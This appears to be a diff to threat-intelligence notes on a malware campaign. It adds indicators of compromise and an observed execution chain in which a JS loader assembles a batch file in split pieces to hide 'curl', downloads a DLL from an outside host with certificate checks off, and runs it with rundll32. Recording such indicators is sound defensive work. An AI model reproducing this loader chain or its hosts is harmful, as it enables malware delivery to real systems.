@@ -6,9 +6,15 @@
 .zip a8d0549b9288e5f98f085d17f062e6c4f95313bef262727af14983c144f3f8d6
 .dll 1b62b7b138dbd3d6b8980e0257b3c35eefbde008b38cb23fb332044e8fc3f5c9
 
+JS Loader Switch and .dll update - Wave 2 new exec
+
+.url https://pm-law.co/wzo7e/
+.zip 99d1faf7a53e5a52870cba26786808374ffa92a12f2f70dba237bbf0af3f9774
+.dll cdefe04ff6ea56f6bd8d69648e9603a8ed6db07e90349592062ce1829693bbc5
+
 *************************************************
 
-url > zip > js > curl > .dll
+Exe #1 - url > zip > js > curl > .dll
 
 wscript.exe C:\Users\Admin\AppData\Local\Temp\Decet.js
 
@@ -51,6 +57,32 @@ SearchProtocolHost.exe
 WerFault.exe -u -p 3620 -s 992
 
 WerFault.exe -pss -s 200 -p 3620 -ip 3620
+
+*************************************************
+
+Exec #2 - url > zip > js > curl > .dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Novxa.js
+
+cmd.exe /c del "C:\Users\Admin\AppData\Local\Temp\Novxa.js
+
+cmd.exe /c echo|set /p="cu" > C:\Users\Admin\AppData\Local\Temp\eveniet.z.bat
+
+cmd.exe /S /D /c echo
+
+cmd.exe /S /D /c set /p=cu 1> C:\Users\Admin\AppData\Local\Temp\eveniet.z.bat
+
+cmd.exe /c echo rl https://empreenda.vc/VjX/920408445 --output C:\Users\Admin\AppData\Local\Temp\sint.q --ssl-no-revoke --insecure --location >> C:\Users\Admin\AppData\Local\Temp\eveniet.z.bat
+
+cmd.exe /c "C:\Users\Admin\AppData\Local\Temp\eveniet.z.bat
+
+curl https://empreenda.vc/VjX/920408445 --output C:\Users\Admin\AppData\Local\Temp\sint.q --ssl-no-revoke --insecure --location 
+
+cmd.exe /c del C:\Users\Admin\AppData\Local\Temp\eveniet.z.bat
+
+cmd.exe /c ren C:\Users\Admin\AppData\Local\Temp\sint.q quo.k
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\quo.k Enter
 
 *************************************************
 
